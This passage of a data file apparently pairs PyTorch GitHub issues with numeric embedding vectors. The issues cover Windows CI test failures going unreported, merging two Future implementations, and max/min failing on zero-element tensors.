  2.05693483e-01 -3.72190475e-01 -9.99123156e-02  3.38544771e-02
 -2.67332315e-01 -1.66166306e-01  2.50091493e-01  5.14113829e-02
 -2.70208418e-01  2.37332970e-01  3.79055329e-02  7.57554471e-02
 -9.82138962e-02  3.56163561e-01 -2.56200969e-01 -1.07485786e-01
  1.92890495e-01 -1.94759548e-01 -1.39574111e-01  1.29816085e-01
  1.15106329e-01  5.45527153e-02  5.43095544e-02 -3.43020678e-01
  5.66299617e-01  9.60477293e-02 -1.87305175e-02  2.10833475e-01
  7.84000456e-02  2.85017528e-02 -3.38539183e-01  3.34359735e-01
 -1.54715478e-01 -2.55018678e-02  1.08563006e-02 -1.46380980e-02
  3.98938842e-02  9.16029438e-02  5.06895967e-02 -8.51260312e-03
 -6.15290403e-02  2.99534619e-01  1.07910305e-01 -3.77439894e-04
 -1.36338905e-01 -2.45968364e-02 -2.17562437e-01  7.64146447e-02
 -2.70006835e-01 -2.57190019e-01 -1.72202572e-01  5.34419678e-02
  2.11672783e-01 -3.69456053e-01 -9.82450545e-02 -2.13874966e-01
 -6.78345487e-02  7.64742419e-02 -3.37413549e-01  2.07147777e-01
  1.43715426e-01  2.49327943e-02  2.47633696e-01 -6.60061315e-02
  1.98806047e-01 -5.18580675e-02  1.41966686e-01 -1.03545450e-02
 -3.51271331e-01  1.16519421e-01  2.15011016e-02  9.31025743e-02
 -2.86823791e-02  4.28483665e-01  2.15504929e-01 -1.85276926e-01
  3.28889847e-01  1.81610882e-01 -5.02367616e-02 -9.93430391e-02
  2.11347654e-01 -1.55739039e-01  3.66976976e-01  1.35964051e-01
 -3.49553078e-02 -9.75306630e-02  3.09623897e-01 -1.47991419e-01
 -5.76431274e-01  1.90307051e-01  2.01601595e-01  2.99300909e-01
  6.19337037e-02  8.66447687e-02 -2.31636316e-02 -2.77066410e-01
 -1.66941762e-01 -5.15805408e-02 -1.82198107e-01  1.74085304e-01
  1.08604863e-01  1.92086816e-01 -3.26673016e-02  5.75862676e-02
  4.13245678e-01  1.35974586e-03  1.08460397e-01 -7.79193863e-02
  3.26536894e-01  9.33995917e-02 -8.16287994e-02 -1.24615029e-01
  6.86089993e-02 -1.20641245e-02  8.43777955e-02  3.73053819e-01
 -1.83648556e-01  9.02653188e-02  2.21115619e-01  2.37834871e-01
  3.06382835e-01  2.25504950e-01 -1.48245126e-01  6.84937388e-02
  7.29765743e-03 -2.94147313e-01  1.27768695e-01 -1.61248475e-01
 -1.76568344e-01  1.03194475e-01  1.89919725e-01 -1.27732158e-01
 -3.96970510e-02  5.56058735e-02 -7.93139115e-02 -2.03408331e-01
 -2.63212830e-01  2.45338649e-01 -3.25290084e-01 -1.37739092e-01
  2.99832702e-01 -1.79973152e-02 -5.38736247e-02 -5.58601171e-02
 -1.53575707e-02 -2.77093410e-01 -2.01447740e-01 -6.85927793e-02
 -2.56823711e-02 -1.39016092e-01  1.32339150e-01  1.21411331e-01
  9.79265273e-02 -4.26278301e-02 -1.83646172e-01 -5.28716087e-01
  2.06370115e-01  1.90691233e-01 -3.56100760e-02  4.49592695e-02
  6.23788312e-03  3.62930477e-01 -2.08456561e-01 -9.98609886e-02
 -1.86591059e-01  4.47111726e-01  2.39157110e-01 -9.75245386e-02
 -1.19935997e-01 -1.19122500e-02  4.79412198e-01  5.81513271e-02
 -2.13089854e-01 -4.23957765e-01 -3.24016333e-01  1.20431647e-01
  2.25629061e-01  8.56937468e-02 -6.93977112e-03 -5.47819808e-02
 -4.73242700e-02 -2.09517963e-02 -3.95577811e-02  1.54878795e-01
 -5.49015284e-01  2.94256300e-01 -4.90158260e-01 -1.20182306e-01
  1.33591354e-01  4.62982729e-02  5.45112835e-03 -7.79688209e-02
  1.28822148e-01 -6.57432973e-02 -5.81347570e-03  7.50546977e-02
 -2.34808177e-01 -2.11776763e-01 -1.16421804e-01  2.92473644e-01
  2.25370154e-01 -3.55701476e-01 -2.45366558e-01 -3.31094742e-01
 -2.41772234e-01  2.53129900e-01 -4.89223488e-02 -3.07155311e-01
 -1.02186739e-01  1.62277833e-01 -8.00530985e-02 -1.03600491e-02
  7.25313872e-02 -2.93630928e-01 -2.27325410e-01  3.07929397e-01
  3.46482694e-02  1.97112367e-01 -8.35617408e-02 -2.71694034e-01
  5.68621904e-02  1.66674316e-01 -7.09965527e-02  1.37747958e-01
 -2.68111099e-03  2.10220188e-01  1.11959517e-01 -7.95389190e-02
  1.72810763e-01  5.92576191e-02 -3.41518968e-03 -2.72437874e-02
 -1.92426324e-01 -1.53552100e-01 -9.17746723e-02  1.68993264e-01
 -5.97983971e-02  6.73283413e-02  2.24643558e-01  1.81461662e-01
  2.46404596e-02  4.46589291e-01 -2.81212151e-01 -8.33538324e-02
 -1.73574015e-01  1.00226164e-01 -3.04736972e-01  2.65915155e-01
 -2.67857969e-01  1.88694537e-01  2.24525034e-01 -1.49715483e-01
  4.23524380e-02 -9.58906040e-02  1.99472368e-01 -1.79191023e-01
  3.35897356e-02  8.58069956e-02 -1.44182786e-01  7.35862792e-01
  1.12931989e-01  9.81471092e-02 -1.86913252e-01  2.68095851e-01
  1.62803292e-01 -1.80115998e-01 -2.44599462e-01 -3.32774580e-01
  2.73564607e-01 -3.09362710e-01  3.14128213e-02 -5.73756397e-02
  4.53526020e-01  3.05061758e-01 -1.50019616e-01 -2.16491461e-01
 -6.78714067e-02  2.90575743e-01 -3.01942050e-01  1.70763433e-01
 -5.42522930e-02 -1.93741679e-01 -1.42370453e-02 -4.07985598e-01
 -1.75670143e-02  6.19481951e-02 -1.06104858e-01  1.86229169e-01
  3.28204334e-01 -1.14141129e-01  3.41656432e-02  2.94053197e-01
  4.46861200e-02 -9.91416872e-02 -1.73970178e-01 -2.43902765e-02
  2.86696970e-01  1.79011866e-01  2.91078329e-01 -1.04082227e-01
  9.28817764e-02  1.47498948e-02  3.69638860e-01 -8.38717073e-02
 -1.25515372e-01 -1.58037037e-01  9.74353403e-02  9.81397480e-02
 -2.25063488e-02  7.12947696e-02 -2.29265794e-01  1.78287685e-01
  1.57621335e-02  3.95588636e-01  1.25747383e-01  2.17749834e-01
 -1.18201517e-01 -1.92950666e-01 -2.41627425e-01  4.77824137e-02
 -1.00707844e-01 -1.60235882e-01 -8.21921527e-02 -3.08974534e-02
 -3.75682980e-01  6.63819313e-02 -1.34124234e-01 -1.16761900e-01
 -4.87562269e-04  5.20992726e-02  9.55450609e-02 -2.11182475e-01
 -4.60576117e-01  3.06636512e-01 -1.16847239e-01 -1.27978072e-01
 -6.05568811e-02 -4.90279347e-02 -1.61083192e-01 -1.62338138e-01
  5.58728389e-02 -2.60447204e-01  2.28272215e-01  2.33847737e-01
 -9.32462420e-03 -2.23026708e-01 -1.24631058e-02  4.04240400e-01
 -9.60316584e-02  7.78197646e-02  2.84357369e-01  8.67579207e-02
 -6.58120364e-02 -1.12659216e-01 -1.15627006e-01  4.94086206e-01
 -4.63325083e-01 -1.22800671e-01 -1.64597929e-01 -4.99010608e-02
  1.74561247e-01 -3.35786164e-01  2.25263298e-01 -2.00579122e-01
  2.40448058e-01  3.81813824e-01  2.01849341e-01  4.64578122e-01
 -2.25882217e-01  1.31173193e-01  3.35754752e-01 -4.21867609e-01
 -3.68745327e-01  3.92383456e-01 -1.75060153e-01 -2.64937311e-01
  1.34983175e-02  2.29787976e-01 -2.36070037e-01 -4.47088331e-02]"
Unit test failures are not reported as failure by Windows CI high priority triage review module: windows module: ci triaged,"For example    [pytorch_windows_vs2019_py36_cuda10.1_test2](https://app.circleci.com/pipelines/github/pytorch/pytorch/144817/workflows/c0ac3f91-edb1-4294-9cf4-aad70b6a89d0/jobs/4916119) reported to have finished successfully, but if one to grep the log, he can observe that number of tests have failed:
```
$ curl ""https://circleci.com/api/v1.1/project/github/pytorch/pytorch/4916119/output/103/0?file=true&allocation-id=5e79202a061b9e62ea99a5d1-0-build%2F29689000""|grep FAILED|grep '('
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3497k    0 3497k    0     0  2466k      0 --:--:--  0:00:01 --:--:-- 2466k
[  FAILED  ] BoundShapeInference.Int8QuantizeInferInputBackwards (1 ms)
[  FAILED  ] MetaprogrammingTest.FilterMap_onlyCopiesIfNecessary (0 ms)
[  FAILED  ] MetaprogrammingTest.FilterMap_onlyMovesIfNecessary_1 (0 ms)
[  FAILED  ] PowTest.LongTensorPowAllScalars (7 ms)
[  FAILED  ] RoiAlignTest.CheckCPUGPUEqual (148 ms)
```

cc @ezyang @gchanan @zou3519 @seemethere @peterjc123",True,"[-0.09066406 -0.36492386  0.0205006   0.06805459 -0.02833039 -0.15333863
 -0.484183    0.08489051 -0.33385348 -0.43890533 -0.01419816 -0.12151377
  0.1858154  -0.30189008 -0.35125738 -0.24259265 -0.01497697 -0.18866304
  0.19056042 -0.02883999 -0.3262401  -0.2971338  -0.5596071   0.00676154
  0.19462462 -0.09935949  0.16099866 -0.37098184 -0.26395866  0.2212662
  0.19034573  0.22066467  0.03191122 -0.08435141  0.47713292 -0.1098829
  0.18592232 -0.38499382 -0.05327932 -0.27334708  0.09365222 -0.02787207
 -0.1708509  -0.04399944 -0.06704365  0.02256797 -0.08807315 -0.11088398
 -0.36363018  0.11811246 -0.04814794  0.2483297   0.2965874  -0.60859036
 -0.11541507 -0.4801945   0.35483712  0.05580415 -0.05281772  0.103218
  0.05137709 -0.5241966   0.2110207  -0.06559995 -0.06722214  0.26412213
 -0.14520992 -0.13467304  0.26570266 -0.24745445  0.06644402  0.01307434
 -0.32446766 -0.23484102  0.21568716  0.2936001  -0.20854878 -0.05836566
  0.28673127 -0.33106485  0.14894275 -0.13963921  0.14021045  0.02633386
  0.35896316 -0.06371935  0.02346331  0.08029824  0.01109    -0.22590202
  0.4952368  -0.10438862  0.16358179  0.3534188   0.02920523  0.36637187
 -0.0198615  -0.15980737 -0.29527074 -0.18582603  0.06496644 -0.11188677
 -0.30760127  0.23569067 -0.21597107 -0.51866615  0.23880094  0.05117416
  0.24173751 -0.19793049  0.30026746 -0.01045758 -0.25697777 -0.11293419
  0.01889762  0.22478898  0.16331404  0.08177876 -0.02101993  0.11887404
 -0.01772968 -0.18748489 -0.09304565 -0.28886116  0.07086203 -0.03450598
 -0.11630439  0.32460123 -0.04530754 -0.11726925  0.25693822  0.06736757
  0.211929   -0.42838633 -0.03979938  0.177353    0.19555068 -0.5293692
 -0.1875642  -0.15125483 -0.0335581   0.22852612  0.03763241 -0.16238973
 -0.09054871 -0.10029514 -0.37089974  0.157171   -0.08600069  0.05661496
  0.31805828  0.26919794  0.06294738  0.31962875  0.15839347 -0.22394782
  0.0255064   0.00921947 -0.01452344 -0.21167623  0.00498548  0.511155
 -0.2188111   0.24953237  0.06469993  0.06456107 -0.39637426  0.0018517
  0.17969733  0.09287271 -0.00238658  0.04883644  0.25622672 -0.35316068
 -0.07013671 -0.00205359 -0.25595915  0.32430023 -0.15827316  0.39319128
  0.01328114  0.23409586  0.29981416  0.17489648  0.13528362  0.30195367
  0.32424635  0.07049384 -0.01324606  0.04632397 -0.30768582  0.30327263
  0.00617629 -0.16824037 -0.14552972 -0.28538865 -0.05477272  0.23151223
 -0.08505027  0.06198359  0.06317395  0.25611708  0.35162959 -0.0738917
  0.01321033  0.111675   -0.4226418  -0.37544438  0.35143566  0.06187281
 -0.16844398 -0.3439456  -0.31756744  0.18413228 -0.2525521   0.4649242
  0.14733446 -0.01228982  0.13823675  0.2486812  -0.13841398  0.09714989
 -0.05740848 -0.27071893 -0.06531708 -0.13340482  0.17196202 -0.11897451
  0.14927894  0.01536434 -0.15207645 -0.24950479  0.008056    0.20973787
  0.58883226 -0.14369865 -0.20290926  0.06158658  0.13621512  0.36739293
 -0.16272588 -0.2723589  -0.13174537  0.05278545  0.09541427  0.44827807
  0.07382343 -0.13546365 -0.35995877  0.18814981 -0.1418668  -0.60308045
  0.31187737 -0.06681254  0.14132708  0.03106754  0.21101451  0.19828728
  0.31962496 -0.2858418   0.7141948   0.19855922 -0.24075595  0.00252764
  0.09170792  0.31247848  0.00611001  0.25925893  0.05472565 -0.03332879
  0.54705185 -0.7938948  -0.15753478  0.20870611  0.16035011 -0.27811292
  0.17072584  0.22983365 -0.23438315  0.13447846  0.22662073  0.21379079
 -0.21341494  0.30271775  0.24907479 -0.05341219  0.23545739 -0.36948615
 -0.27224255 -0.17166829  0.04572753  0.10066819  0.51878333  0.1335418
 -0.36729282  0.25578082  0.09528115 -0.2249839   0.09809208 -0.03666696
 -0.70741487 -0.10327013 -0.1234428  -0.3499685  -0.34337765 -0.11976084
  0.03229203  0.28155458  0.20422493 -0.46298298  0.22421458  0.28970408
  0.20548198  0.10753202 -0.38442907 -0.07795224 -0.24122387  0.4604218
 -0.02021196  0.17836168 -0.12507188  0.05494659 -0.47290468  0.15400462
  0.2652595   0.10937007 -0.42842445 -0.06597413  0.03370365  0.06104036
  0.06618306 -0.11599887 -0.35508648 -0.06814276  0.17959805  0.12389575
 -0.01664143  0.38508588  0.3827809  -0.06586245  0.14634    -0.0265473
  0.5594562   0.06366194 -0.06943442  0.08986538  0.09008289  0.03403361
  0.10673864 -0.07406918 -0.05586465  0.0131737  -0.20752543 -0.23392802
 -0.10859454  0.32174557  0.24649076  0.2592643   0.38376585  0.17816553
 -0.22626993 -0.23161978 -0.47206134 -0.04278324  0.25107926 -0.02751134
 -0.41255873 -0.34498897 -0.20864287  0.20155287 -0.49919742  0.04515576
  0.10065497  0.1672757   0.32790494 -0.05880889  0.30839753 -0.18404204
  0.03312036  0.256804    0.13139763  0.03419241  0.00436787  0.22836524]"
[Master Plan] Merge c10::ivalue::Future and torch::utils::Future<T> oncall: jit triaged better-engineering module: rpc,"Ideally we should have one Future abstraction in PyTorch codebase to have unified code paths regarding Future usage. 

torch::utils::Future<T> is a generic Future, we can specialize it as torch::utils::Future[IValue] and make torch::utils::Future[IValue] to be an IValue. After that, we can kill c10::ivalue::Future implementation

cc @suo @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar @ilia-cher @wanchaol ",True,"[-2.01750517e-01  1.92844421e-01 -1.44329518e-01 -3.78956825e-01
 -3.57438505e-01 -1.09198585e-01  1.43544953e-02  8.68242383e-02
 -3.29309046e-01 -1.98297799e-01 -2.79769719e-01  5.83711937e-02
 -9.51564610e-02  1.58122182e-01  2.75005847e-01  2.46995151e-01
  1.78079102e-02  1.10629342e-01  1.30097419e-01 -2.92235702e-01
  2.63683379e-01  1.49069250e-01 -1.55046135e-01 -1.30233124e-01
 -4.74712133e-01  1.49352521e-01  2.86556110e-02 -4.22703363e-02
  2.84122676e-01  8.81706551e-02  4.23366219e-01  5.18179893e-01
 -6.91466749e-01 -1.34732530e-01  5.51361591e-05  1.65052772e-01
 -4.41588402e-01  2.38454834e-01  7.25693107e-02 -1.19687719e-02
  6.33857399e-02  3.48077416e-01 -2.09606081e-01 -6.11246601e-02
  1.17343199e-02 -9.19802412e-02  1.64431818e-02  4.19809483e-02
 -2.88955957e-01  5.91159984e-02 -2.66250670e-01 -2.91928470e-01
 -2.10342616e-01 -4.32612374e-04  7.63037950e-02 -6.17620535e-02
 -3.11299562e-01 -1.61182359e-01  2.00553730e-01 -3.33328247e-01
  1.06213719e-01 -5.57110459e-02  7.19345510e-02  2.67499059e-01
  1.29139617e-01  6.65299594e-02 -5.21099055e-03  1.73794702e-01
  8.28470588e-02  2.06788212e-01 -4.79925990e-01 -1.89144194e-01
 -1.38599604e-01 -5.37975550e-01 -1.48858935e-01  1.37598449e-02
 -3.00122857e-01  2.03055799e-01  1.68867886e-01 -1.94951192e-01
  2.06228867e-01  1.83163717e-01 -1.61702745e-02  1.79422982e-02
  3.43807936e-02  9.35866162e-02  5.46989664e-02  4.88597974e-02
 -5.00030108e-02 -1.20019242e-01  2.15661600e-02  7.64193982e-02
  2.82028139e-01  4.84395683e-01  2.96604037e-01  3.45307648e-01
 -1.24312162e-01 -5.42548835e-01  2.03036964e-01 -9.56964195e-02
 -4.49325413e-01 -2.17359662e-01 -4.29099090e-02  1.44871160e-01
  4.38844636e-02 -3.28570992e-01  1.70444459e-01  4.08687353e-01
  4.79836941e-01 -2.32120216e-01  8.63307565e-02  2.34423146e-01
  1.81360960e-01 -3.59124035e-01 -8.46758783e-02 -8.47091079e-02
  4.97514792e-02  1.49171231e-02  3.20780098e-01  9.61005688e-03
  2.12198347e-01 -3.36469412e-02  8.54781866e-02  3.01146269e-01
  3.90109152e-01  6.85355440e-03 -1.70881264e-02  2.04322368e-01
  4.08922806e-02  1.60080045e-01  2.73739457e-01  1.27425194e-01
 -9.00290534e-02  2.30563045e-01  3.73616904e-01  3.80389504e-02
 -3.71296376e-01 -7.07068890e-02 -1.07684210e-01 -8.58861953e-02
 -2.70615458e-01  2.39552259e-01  3.20242226e-01 -4.43337023e-01
  3.78908664e-02  8.80372748e-02 -3.07643432e-02 -1.98883638e-01
 -5.15381470e-02 -2.91232914e-02 -1.83691144e-01 -4.16980535e-01
  1.36611164e-01  5.21393716e-01  3.70092869e-01  2.22281367e-02
 -1.40217647e-01  8.87806416e-02  2.07049221e-01 -1.51179850e-01
 -2.28310719e-01  3.12987864e-01  6.38725050e-03 -1.37695000e-01
 -1.20066330e-01 -2.29963303e-01 -8.40454474e-02 -2.62224436e-01
 -2.97819376e-01  1.61785692e-01 -2.64253080e-01 -1.37311965e-01
  8.40039998e-02 -2.18697965e-01  3.18902373e-01  6.45952970e-02
 -4.26827185e-02 -2.70889759e-01 -1.00726813e-01  3.31643462e-01
  5.05741090e-02  1.79233626e-01  1.24142163e-01 -1.65105209e-01
 -1.51894717e-02  1.89463124e-01  6.64021790e-01  2.42636263e-01
 -3.42579842e-01 -2.16764718e-01 -5.27870119e-01  3.74692008e-02
  1.30446590e-02  1.66639954e-01  6.75428361e-02 -2.80012727e-01
  2.34024003e-01 -6.66615739e-02 -9.53527018e-02 -1.19014412e-01
 -3.29020023e-02  3.33183318e-01 -1.14904247e-01 -9.36660469e-02
  2.76742756e-01  2.02435195e-01 -1.83233559e-01  2.59837639e-02
 -4.00565684e-01  4.43931967e-02 -2.15411887e-01 -4.18562442e-03
  2.11758301e-01  4.30953875e-03  1.92573354e-01  5.33010885e-02
 -2.61236042e-01  2.46093154e-01 -2.09213167e-01  9.88476947e-02
  3.14678967e-01  2.34227329e-01  2.57242084e-01 -4.58594412e-01
  1.59001231e-01  3.66334140e-01 -6.10589862e-01  2.53811538e-01
 -1.84233561e-02 -3.01526248e-01  7.41157681e-02 -2.67633677e-01
  1.84656247e-01  8.49747360e-02 -3.90249431e-01  2.95397907e-01
  3.19338977e-01 -9.14768949e-02 -3.79731834e-01  5.34966849e-02
 -1.00307308e-01 -1.60637438e-01  3.67148705e-02 -1.25082061e-01
 -3.55319142e-01  3.41803074e-01 -6.31717443e-01 -1.96147799e-01
  1.96974233e-01  4.47307765e-01 -1.18131220e-01 -2.42199466e-01
 -5.71126118e-02  4.38946113e-02 -1.43695742e-01 -1.86897248e-01
  2.27439757e-02  1.25694517e-02  2.05365062e-01 -1.02441693e-02
  1.03000700e-01 -2.59653687e-01  1.60848685e-02  3.90687823e-01
  4.76702631e-01  7.20539540e-02 -3.47149998e-01  4.36728746e-02
 -3.15946430e-01 -1.64649636e-02 -3.33961636e-01  1.03970654e-01
  4.13566589e-01  1.63267881e-01  1.08409002e-01 -2.48729717e-02
  3.49069446e-01 -4.70568061e-01  1.85704783e-01 -1.33729447e-03
  2.31473178e-01 -7.59531334e-02 -2.62136698e-01  3.73717427e-01
  1.62328541e-01 -4.67547268e-01  3.36068213e-01  4.26705405e-02
 -3.84812355e-02 -1.95706144e-01 -1.50669113e-01  1.83659911e-01
  6.34152442e-02  7.32775629e-02  6.30623475e-02  1.38600677e-01
 -3.70956600e-01 -7.78979287e-02  2.71443248e-01 -1.34615339e-02
  2.05349207e-01 -5.86226583e-04  1.34138554e-01  3.58639583e-02
 -2.83495277e-01  2.39329904e-01  2.68186033e-01 -2.14541823e-01
  4.44419444e-01 -2.21705914e-01  1.74622595e-01  2.03065097e-01
  1.26625538e-01  1.26406550e-01 -3.18577290e-01  7.63887316e-02
 -2.18696862e-01 -1.40429705e-01 -1.12197608e-01 -3.73341143e-04
 -5.00499010e-02 -1.20823875e-01 -9.74579528e-02 -8.08436573e-02
 -6.31912872e-02  1.24610491e-01 -2.97010690e-01  4.82664481e-02
 -1.18615776e-01  6.73290044e-02  3.30244064e-01  2.50008404e-01
  4.25471157e-01  3.28235507e-01 -1.03712633e-01  2.33345497e-02
 -9.87205058e-02 -3.33469599e-01 -2.19605297e-01 -1.23407595e-01
 -3.09691757e-01  1.32408708e-01 -4.56991941e-02  6.80601075e-02
 -1.98790446e-01 -2.60779969e-02  2.07561255e-01  2.65364707e-01
 -1.12622984e-01  6.75434768e-02  1.70032650e-01  1.30090311e-01
 -1.22111216e-01  9.19872820e-02 -2.56351829e-01 -1.67935625e-01
  1.69954926e-01  2.18097925e-01  2.99396124e-02  3.47868979e-01
 -1.87113196e-01  1.19496405e-01 -9.06756334e-03  1.19062915e-01
  4.22730297e-02 -1.79668933e-01  9.64190662e-02 -3.57812554e-01
 -2.16274634e-01  9.02873948e-02 -8.07065368e-02  1.38113037e-01
  4.92518842e-02  5.30999526e-02  5.21351337e-01 -1.71382390e-02
  1.91936553e-01  1.30390435e-01 -4.22957130e-02  4.81380038e-02
 -7.97316432e-02  3.59138474e-03 -2.40964685e-02 -2.80097783e-01]"
max / min doesn't work on tensors with 0 elements high priority triaged module: numpy module: reductions,"## ðŸ› Bug

Current `min` / `max` implementation is too restrictive wrt tensors with zero elements.
Indeed, min/max reduction over an empty dimension should raise an error, as they don't have an identity, but if the dimension being reduced is not of size 0 (but the tensor has 0 elements), then it should work.

## To Reproduce

```python
a = torch.rand(0, 4)
print(a.max(1))
```
raises
```
RuntimeError: cannot perform reduction function max on tensor with no elements because the operation does not have an identity
```
while
```python
a = torch.rand(0, 4)
print(a.numpy().max(1))
```
returns
```
array([], dtype=float32)
```

---
PyTorch version `1.5.0.dev20200225`

cc @ezyang @gchanan @zou3519 @mruberry @rgommers @heitorschueroff",True,"[-8.70180875e-02 -2.13026702e-01 -3.07505578e-01 -2.45494276e-01
 -2.29673252e-01 -3.81891072e-01  7.49365687e-02 -2.27487274e-03
 -3.98666143e-01  1.19524524e-02 -4.70847860e-02  2.52963185e-01
  1.03228696e-01  3.34907770e-01 -9.46003422e-02  3.84612322e-01
 -6.79242760e-02  1.66761741e-01 -4.03155804e-01 -1.26272649e-01
 -2.86200531e-02 -2.56887227e-01 -1.71576321e-01  1.90866441e-01
  2.25889236e-01 -1.29507616e-01  9.64743085e-03 -1.79440737e-01
  3.93468946e-01 -1.44314021e-04  3.86666767e-02  6.27477393e-02
  1.91916555e-01 -1.53196603e-01 -1.15983732e-01  4.33222383e-01
 -1.52797446e-01 -1.71065509e-01 -4.78043109e-02  1.62180871e-01
 -5.86956888e-02  8.82087350e-02  9.59677696e-02  4.96843122e-02
 -2.89563416e-03  1.70547873e-01  2.44138818e-02  1.64668232e-01
 -1.47433028e-01 -1.25031561e-01 -7.66901374e-02  4.46233213e-01
 -2.54840255e-01 -3.02229822e-01 -1.03681110e-01  7.55535886e-02
 -1.27438992e-01 -1.85278043e-01 -9.73610282e-02 -3.59168440e-01
 -1.41169354e-01  2.45657355e-01  3.41468640e-02 -1.24428198e-02
  2.59443343e-01  1.16394490e-01  4.04072434e-01 -3.01610716e-02
  1.35286629e-01  3.07970554e-01  4.18062419e-01  1.37250870e-02
 -3.97920638e-01  1.28885239e-01  3.80856097e-02  2.59262472e-01
  1.36939794e-01  3.24235499e-01  3.09335053e-01  9.08014923e-02
 -4.33763087e-01 -2.35986300e-02  1.72248885e-01 -3.27299714e-01
  3.94498035e-02 -1.53583676e-01  5.07817566e-01  1.04537383e-01
  3.67768943e-01 -1.85071617e-01  4.29387391e-01  2.22003069e-02
 -5.22528529e-01  5.58309965e-02  2.54360557e-01  1.49150770e-02
  2.57480681e-01  2.58451998e-01 -3.47932577e-01 -1.75271958e-01
 -1.43687069e-01 -2.24669665e-01 -3.75395298e-01  1.65873662e-01
  1.78493306e-01  2.69174427e-01  1.70731153e-02  2.61169560e-02
  1.76086873e-01  2.71238148e-01  4.54852283e-01 -1.51299194e-01
  2.59475648e-01  2.57084131e-01  3.69734690e-02  1.51334554e-01
  1.43505186e-01  1.75360337e-01  2.10505709e-01  3.16610068e-01
 -9.58230197e-02  1.15149871e-01  1.27677500e-01  2.68216729e-01
  1.14944875e-01  3.96465421e-01  1.42908962e-02 -1.27627909e-01
 -2.14577862e-03 -1.35472938e-01  2.80651659e-01  1.08999908e-02
 -3.04652810e-01  3.81559014e-01 -1.64809674e-02  3.68083976e-02
 -1.02440774e-01  1.88129202e-01 -4.76152003e-01  7.26656541e-02
 -1.67889055e-02 -1.84504420e-01 -2.41991766e-02 -3.42100084e-01
  2.76421368e-01  1.65146038e-01 -3.52053881e-01  7.89545178e-02
 -1.43551558e-01 -1.09720908e-01 -2.80179918e-01  2.98224926e-01
 -1.11738890e-01 -1.17536314e-01  1.16854414e-01  9.35000926e-02
  9.38701034e-02 -2.07740843e-01 -3.11602116e-01 -5.00384569e-01
  1.66395634e-01  2.21904129e-01  3.94271314e-02 -2.24949457e-02
  3.50960158e-02  4.19372290e-01 -2.88573354e-01 -1.00298226e-01
 -1.75997421e-01  4.92044717e-01 -5.73484078e-02 -1.20206423e-01
 -2.34274685e-01 -1.83736458e-02  6.07905865e-01 -1.85017496e-01
 -3.62631619e-01 -5.52978516e-01  3.13485079e-02  2.11247534e-01
  9.03143063e-02  4.82633859e-02  8.66995677e-02 -2.24383950e-01
 -3.93537544e-02  8.96603521e-03  2.32901782e-01  1.11684799e-01
 -1.28314532e-02 -5.79340123e-02 -1.10769555e-01 -2.23645568e-01
  2.14308396e-01 -1.24327026e-01  9.54903364e-02 -1.37063920e-01
  9.10870731e-03 -2.43952796e-01 -2.71892678e-02  1.54271320e-01
 -9.34405252e-02 -1.47864386e-01 -3.92594710e-02  7.96110481e-02
  4.27238911e-01 -2.91001290e-01 -1.89905286e-01 -4.88280952e-01
 -4.18391824e-02  2.77013481e-01 -8.77028927e-02 -4.26463962e-01
  1.18018471e-01 -3.09213668e-01 -3.37607473e-01  1.54699266e-01
  1.50651544e-01 -3.83139908e-01 -2.15192005e-01  1.87348828e-01
  8.79776478e-02 -1.12364697e-03 -1.59874588e-01 -3.66862118e-01
 -6.94439486e-02 -1.65826023e-01 -3.53309214e-02 -1.94456011e-01
  3.41103151e-02  1.85267046e-01  1.86322510e-01 -6.19380474e-02
  1.00665793e-01 -1.36803448e-01 -9.25194025e-02 -1.05825290e-01
 -1.98536232e-01 -8.47497731e-02 -6.48829192e-02  2.38847643e-01
 -3.88989300e-01 -1.77658454e-01 -1.99149363e-03  1.45992547e-01
  9.64454096e-03  4.57952708e-01 -1.48990422e-01  1.05251558e-03
 -3.73856783e-01  3.96659315e-01 -2.14941740e-01  1.60827190e-01
  3.49681944e-01  1.90924089e-02  3.02433372e-01 -1.88376397e-01
  1.37158602e-01  9.41065624e-02  1.72916159e-01 -2.91334927e-01
  2.70890594e-01  3.25014800e-01 -1.01657011e-01  5.92888176e-01
  6.19234741e-02  7.81506449e-02 -1.74417332e-01  4.90919083e-01
  2.96466947e-01 -3.28433514e-01  1.20510310e-02 -1.31989777e-01
 -6.61532581e-03 -4.66041774e-01 -9.02487263e-02 -3.27793539e-01
  4.72907037e-01  2.66013384e-01 -1.09179929e-01 -3.29442233e-01
 -1.82135344e-01  2.42469102e-01 -2.87506819e-01  1.32528543e-01
 -9.17056948e-02 -2.99056709e-01  3.27313729e-02 -1.70374393e-01
 -1.08583808e-01  3.16044450e-01 -2.60689050e-01  2.18489364e-01
 -2.22568344e-02 -9.83738825e-02 -1.23064905e-01  4.08039659e-01
  5.11931702e-02 -1.20362557e-01 -3.42472553e-01 -5.22384346e-02
  2.94440985e-01  1.09695248e-01  2.68597484e-01  8.33702162e-02
 -9.55444276e-02  6.32339790e-02  7.59575590e-02  9.97686982e-02
  1.07045867e-01 -1.02579422e-01  8.54735821e-02 -5.11228591e-02
 -1.01728767e-01  2.94458151e-01 -1.36116162e-01  8.87746662e-02
 -6.99844211e-02  5.86912751e-01  2.46893734e-01 -2.31813565e-02
 -2.63350129e-01 -1.12916633e-01 -3.19369316e-01  4.55060601e-02
 -9.95343626e-02  2.02867746e-01 -1.89683050e-01 -2.93791950e-01
 -1.11350380e-01  6.27014637e-02  1.25401720e-01 -2.37735718e-01
 -3.06218714e-01 -5.11979833e-02 -1.30373597e-01 -2.09118068e-01
 -3.06069613e-01  1.08928114e-01 -3.19140963e-02  1.93025414e-02
  5.70723452e-02  1.18626453e-01 -9.75103825e-02 -2.72162080e-01
  8.45887605e-03 -4.15988863e-01  2.92635918e-01  2.79239953e-01
 -9.67440009e-02 -3.02288413e-01 -1.09691173e-01  1.63276851e-01
 -1.40030980e-01  2.62018085e-01  2.24291518e-01  1.20757215e-01
  1.35431066e-04  1.31762236e-01 -9.60960537e-02  2.25295082e-01
 -3.31318974e-01 -5.58190979e-03 -3.44818056e-01 -2.01050229e-02
  1.89228848e-01 -4.21027631e-01 -6.41834214e-02 -1.91317052e-01
  2.36578882e-01  2.65952766e-01  2.69393951e-01  4.41302180e-01
 -7.03494772e-02  5.98235130e-01  3.46882284e-01 -2.28904381e-01
 -3.21893752e-01  3.33005697e-01 -1.49007171e-01 -1.70660354e-02
  5.70496693e-02  5.21578379e-02 -9.31610167e-02 -1.16102826e-02]"
